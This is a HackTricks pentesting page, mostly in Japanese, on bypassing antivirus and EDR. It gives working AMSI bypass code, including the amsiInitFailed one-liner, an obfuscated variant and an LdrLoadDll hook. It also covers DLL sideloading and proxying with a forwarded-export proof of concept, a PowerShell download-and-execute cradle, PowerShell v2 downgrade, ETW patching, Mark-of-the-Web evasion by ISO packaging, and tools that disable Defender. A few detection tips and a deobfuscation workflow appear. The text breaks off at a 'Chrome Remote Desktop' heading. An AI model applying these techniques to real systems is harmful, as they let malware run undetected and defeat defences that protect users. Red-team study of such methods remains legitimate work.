# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender を動作しなくするツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender を動作しなくするツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis といった異なる手法を使用します。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列にフラグを立てること、さらにファイル自体から情報を抽出すること（例: file description, company name, digital signatures, icon, checksum など）によって行われます。つまり、既知の公開ツールを使うと既に分析され悪意ありとマークされている可能性が高く、検出されやすくなります。こうした検出を回避する方法はいくつかあります:

- **Encryption**

  バイナリを暗号化すれば、AV がプログラムを検出する方法はなくなりますが、メモリ上で復号して実行するための何らかの loader が必要になります。

- **Obfuscation**

  時にはバイナリやスクリプト内のいくつかの文字列を変更するだけで AV を回避できますが、何を難読化するかによっては手間のかかる作業になることがあります。

- **Custom tooling**

  独自ツールを開発すれば既知の悪性シグネチャは存在しませんが、多くの時間と労力がかかります。

> [!TIP]
> Windows Defender の static detection に対してチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。基本的にファイルを複数のセグメントに分割して Defender に個別にスキャンさせることで、バイナリ内でどの文字列やバイトがフラグ化されているかを正確に教えてくれます。

この実践的な AV Evasion に関する [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) はぜひチェックしてください。

### **Dynamic analysis**

Dynamic analysis は、AV がサンドボックス内でバイナリを実行して悪意ある活動（例: ブラウザのパスワードを復号して読み取ろうとする、LSASS に対する minidump を実行するなど）を監視する手法です。この部分はやや扱いが難しいですが、サンドボックスを回避するためにできることはいくつかあります。

- **Sleep before execution** 実装次第では、AV の dynamic analysis をバイパスする有効な方法になり得ます。AV はユーザーのワークフローを妨げないようにファイルスキャンに非常に短い時間しか使えないため、長い sleep を使うことでバイナリの分析を妨げることができます。ただし、多くの AV のサンドボックスは実装に応じて sleep をスキップしてしまうことがあります。
- **Checking machine's resources** 通常、サンドボックスは利用可能なリソースが非常に少ない（例: < 2GB RAM）ため、リソースをチェックすることで判別できます。さらに創造的に、CPU 温度やファン速度をチェックするなど、すべてがサンドボックスに実装されているわけではありません。
- **Machine-specific checks** 特定のユーザーのワークステーションが "contoso.local" ドメインに参加していることをターゲットにしたい場合、コンピュータのドメインをチェックして指定したものと一致するかを確認し、一致しなければプログラムを終了させることができます。

Microsoft Defender のサンドボックスの computername は HAL9TH であることが判明しています。したがって、マルウェア実行前にコンピュータ名をチェックし、名前が HAL9TH と一致する場合は Defender のサンドボックス内にいると判断してプログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes に対抗するための [@mgeeky](https://twitter.com/mariuszbit) からのその他の非常に良いヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

前述のように、**public tools** はいずれ**検出されます**。そこで自分に問うべきことがあります:

例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？それとも、あまり知られていない別のプロジェクトで LSASS をダンプできるものを使えるのか。

正しい答えはおそらく後者です。mimikatz を例に取ると、そのプロジェクト自体は非常に優れていますが、AV や EDR によって最も多くフラグ付けされるツールの一つであり、AV を回避するために扱うのは悪夢のような作業になります。したがって、達成したいことに対して代替手段を探してください。

> [!TIP]
> ペイロードを回避のために修正する際は、Defender の **turn off automatic sample submission** を必ず行ってください。そして真剣に、長期的な回避を目標とするなら **DO NOT UPLOAD TO VIRUSTOTAL**（VirusTotal にアップロードしない）ことを守ってください。特定の AV によってペイロードが検出されるか確認したい場合は、VM にその AV をインストールし、automatic sample submission をオフにして、満足するまでそこでテストしてください。

## EXEs vs DLLs

可能な限り、常に **prioritize using DLLs for evasion** を心がけてください。私の経験では、DLL ファイルは通常 **way less detected** で解析されにくいため、（ペイロードが DLL として実行可能であれば）検出を回避するための非常にシンプルなトリックになります。

この画像からわかるように、Havoc の DLL ペイロードは antiscan.me で検出率が 4/26 であるのに対し、EXE ペイロードは 7/26 の検出率でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** はローダーが使用する DLL 搜索順序を利用し、被害者アプリケーションと悪意あるペイロードを同じディレクトリに配置することで成立します。

DLL Sideloading に脆弱なプログラムは [Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って確認できます:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking に脆弱なプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

私は **explore DLL Hijackable/Sideloadable programs yourself** を強くおすすめします。この技術は適切に行えば非常にステルス性が高いですが、既知の DLL Sideloadable プログラムを使うと簡単に見つかる可能性があります。

プログラムが期待する名前の悪意ある DLL を置いただけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数を期待しているためです。この問題を解決するために、別のテクニックである **DLL Proxying/Forwarding** を使用します。

**DLL Proxying** は、プロキシ（および悪意ある）DLL から元の DLL へプログラムが行う呼び出しを転送することで、プログラムの機能を維持しつつあなたの payload の実行を扱えるようにします。

私は [@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。

以下が私が行った手順です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは、次の2つのファイルを生成します: DLL のソースコードテンプレートと、リネームされた元の DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **強くおすすめします**： [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)（DLL Sideloading に関する）と、[ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を視聴すると、ここで議論した内容をより深く学べます。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- `TargetDll` がまだロードされていなければロードする
- そこから `TargetFunc` を解決する

Key behaviors to understand:
- `TargetDll` が KnownDLL の場合、保護された KnownDLLs namespace（例: ntdll, kernelbase, ole32）から供給される。
- `TargetDll` が KnownDLL でない場合、通常の DLL 検索順序が使われ、その中には forward 解決を行っているモジュールのディレクトリが含まれる。

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決される。

PoC (コピー＆ペースト):
1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の `DllMain` があればコード実行を得るのに十分です。`DllMain` をトリガーするためにフォワードされた関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) サイン済みの LOLBin を使用してフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
観測された挙動:
- `rundll32` (署名済み) がサイドバイサイドの `keyiso.dll` (署名済み) を読み込む
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後ローダーは `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` が既に実行された後でのみ "missing API" エラーが発生する

ハンティングのヒント:
- ターゲットモジュールが KnownDLL ではないようなフォワードされたエクスポートに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- フォワードされたエクスポートは次のようなツールで列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 の forwarder inventory を参照して候補を探してください: https://hexacorn.com/d/apis_fwd.txt

検知・防御のアイデア:
- LOLBins (例: rundll32.exe) が非システムパスから署名済み DLL を読み込み、そのディレクトリから同じベース名の non-KnownDLLs を読み込む動作を監視する
- ユーザー書き込み可能なパス下で、次のようなプロセス/モジュールチェーンを検出してアラートする: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- コード整合性ポリシー (WDAC/AppLocker) を適用し、アプリケーションディレクトリで write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使うと、shellcode を目立たない方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避は常にネコとネズミのゲームです。今日有効でも明日検出される可能性があるため、単一のツールだけに頼らないでください。可能なら複数の回避手法を組み合わせてください。

## AMSI (Anti-Malware Scan Interface)

AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られました。当初、AVはディスク上のファイルのみをスキャンできたため、ペイロードをメモリ上で直接実行できれば、AVは防ぐ手段がほとんどありませんでした（可視性が足りなかったため）。

AMSI機能はWindowsの次のコンポーネントに統合されています。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

AMSIはスクリプトの内容を非暗号化・非難読化された形式で公開することで、アンチウイルスがスクリプトの振る舞いを検査できるようにします。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

スクリプトが実行された実行ファイルへのパス（この場合は powershell.exe）の前に `amsi:` が付与されているのがわかります。

ファイルをディスクに落としていなくても、AMSIのためにメモリ上で検出されてしまいました。

さらに、**.NET 4.8** 以降では、C#コードもAMSIを通して実行されます。これは `Assembly.Load(byte[])` を使ったメモリ内実行にも影響します。したがって、AMSIを回避してメモリ実行を行いたい場合は、4.7.2以下などの古いバージョンの .NET を使うことが推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主に静的検知で動作するため、読み込もうとするスクリプトを変更することは検出回避に有効な場合があります。

ただし、AMSIは複数層の難読化でも可能な限り復号してしまう能力があるため、難読化のやり方によっては有効でないことがあります。そのため回避は必ずしも単純ではありません。とはいえ、変数名を数箇所変えるだけで十分なこともあるため、どれだけフラグが付いているか次第です。

- **AMSI Bypass**

AMSIはDLLをpowershell（および cscript.exe, wscript.exe など）プロセスにロードすることで実装されているため、特権のないユーザでも簡単に改変することが可能です。この実装上の欠陥により、研究者たちはAMSIスキャンを回避する複数の手法を見つけています。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と、そのプロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはこれを広く使われるのを防ぐためにシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
たった1行の powershell コードで、現在の powershell プロセスに対して AMSI を使用不能にできた。この1行は当然 AMSI によって検出されるため、この手法を使うには修正が必要だ。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した修正済みの AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
念のため、この記事が公開されるとおそらく検知される可能性があるため、検出を避けたいのであればコードを公開しないでください。

**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。手法の内容は、ユーザーから提供された入力をスキャンする役割を持つ `AmsiScanBuffer` 関数の `amsi.dll` 内のアドレスを特定し、`E_INVALIDARG` を返す命令で上書きするというものです。こうすることで実際のスキャン結果は `0` を返し、クリーンと解釈されます。

> [!TIP]
> 詳細な説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を参照してください。

AMSI を powershell で bypass するための他の多くの手法も存在します。詳しくは [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を参照してください。

### AMSI をブロックするために amsi.dll のロードを防ぐ (LdrLoadDll hook)

AMSI は現在のプロセスに `amsi.dll` がロードされた後に初期化されます。言語非依存で堅牢なバイパス手法として、要求されたモジュールが `amsi.dll` の場合にエラーを返すよう `ntdll!LdrLoadDll` に user‑mode hook を設置する方法があります。その結果、AMSI はロードされず、そのプロセスではスキャンが行われません。

実装の概要 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- PowerShell、WScript/CScript、およびカスタムローダーなど、AMSIをロードするものすべてで動作します（通常はAMSIをロードするもの全般）。
- スクリプトを標準入力（stdin）経由で渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて、長いコマンドラインの痕跡を避けます。
- LOLBins経由で実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼ぶ）の使用例が確認されています。

このツール [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) は AMSI をバイパスするスクリプトも生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用して、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。これらのツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを検出し、それを NOP 命令で上書きしてメモリから事実上削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使用すると、AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のように実行します:
```bash
powershell.exe -version 2
```
## PS ロギング

PowerShell logging はシステム上で実行されたすべての PowerShell コマンドを記録する機能です。これは監査やトラブルシューティングに役立ちますが、検出を回避したい攻撃者にとっては **問題になり得ます**。

PowerShell ロギングをバイパスするには、次の手法を使用できます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のようにします: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御機能のない powershell を起動します（これは Cobal Strike の `powerpick` が使う方法です）。


## 難読化

> [!TIP]
> いくつかの難読化手法はデータを暗号化することに依存しており、これによりバイナリのエントロピーが増加して AVs や EDRs に検出されやすくなります。これには注意し、暗号化はセンシティブな部分や隠す必要がある特定セクションにのみ適用することを検討してください。

### ConfuserEx によって保護された .NET バイナリの難読化解除

ConfuserEx 2（または商用フォーク）を使用するマルウェアを解析すると、複数の保護レイヤによりデコンパイラやサンドボックスが阻害されることがよくあります。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼオリジナルの IL を確実に **復元します**。

1.  改竄防止の除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の静的コンストラクタ (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされ、改変するとバイナリがクラッシュします。暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き直すために **AntiTamperKiller** を使用してください：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には、独自のアンパッカーを作る際に役立つ6つの改竄防止パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれます。

2.  シンボル／制御フローの回復 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は制御フローのフラット化を元に戻し、元の名前空間、クラス、変数名を復元し、定数文字列を復号します。

3.  Proxy-call の除去 – ConfuserEx はデコンパイルをさらに困難にするために直接のメソッド呼び出しを軽量のラッパー（いわゆる *proxy calls*）に置換します。これらは **ProxyCall-Remover** で除去してください：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この手順の後、曖昧なラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が観察できるはずです。

4.  手動クリーンアップ – 得られたバイナリを dnSpy で実行し、大きな Base64 のブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはそれを TLV エンコードされたバイト配列として `<Module>.byte_0` 内で初期化して格納しています。

上記の手順により、悪意のあるサンプルを実行することなく**実行フローを復元**できます — オフラインの作業環境で作業する際に有用です。

> 🛈 ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的にトリアージする IOC として使用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と tamper-proofing を通じてソフトウェアのセキュリティを高めることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` 言語を用いて、コンパイル時に外部ツールやコンパイラの変更を行わずに obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションの解析や crack を試みる人の手間を多少増やします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の executables 向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する LLVM-supported languages 向けの細粒度の code obfuscation framework です。ROPfuscator は通常の命令を ROP chains に変換することで、アセンブリコードレベルでプログラムを obfuscate し、通常の制御フローの概念を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> 重要なのは、**信頼された** 署名証明書で署名された実行ファイルは **SmartScreen を起動しない** という点です。

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、ペイロードを出力コンテナにパッケージ化して Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントを**ログする**ための強力な Windows のログ機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSI が無効化（バイパス）される方法と同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントをログせずに即座に戻るようにすることも可能です。これは関数をメモリ上でパッチして即座に戻すようにすることで行われ、そのプロセスに対する ETW ロギングを事実上無効化します。

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# アセンブリのリフレクション

C# バイナリをメモリ内でロードする手法は以前から知られており、AV に検出されずにポストエクスプロイトツールを実行するための非常に有効な方法です。

ペイロードがディスクに触れることなく直接メモリにロードされるため、プロセス全体について AMSI をパッチすることだけを気にすればよくなります。

ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかの違いがあります:

- **Fork\&Run**

これは新しい犠牲プロセスを**生成**し、その新プロセスにポストエクスプロイトの悪意あるコードを注入して実行し、終了したらそのプロセスを終了させる手法です。利点と欠点の両方があります。fork and run の利点は、実行が我々の Beacon インプラントプロセスの**外部**で行われることです。つまり、ポストエクスプロイトの動作で何かが失敗したり検出されたりしても、我々のインプラントが生き残る**可能性がずっと高い**ということです。欠点は、**Behavioural Detections** に検出される**可能性が高くなる**点です。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これはポストエクスプロイトの悪意あるコードを**自身のプロセスに注入**する手法です。これにより新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロードの実行で問題が発生した場合にプロセスがクラッシュしてビーコンを失う**可能性が高くなる**という欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell からも C# アセンブリをロードできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

SMB 共有上のインタープリタバイナリや環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による任意のコードを**実行する**ことが可能になります。

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティ製品を**操作する**ことで、プロセスが終了しないように権限を落としつつ、悪意ある活動を検出する権限を持たせない状態にする手法です。

これを防ぐために Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得するのを**防止する**ようにすることが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

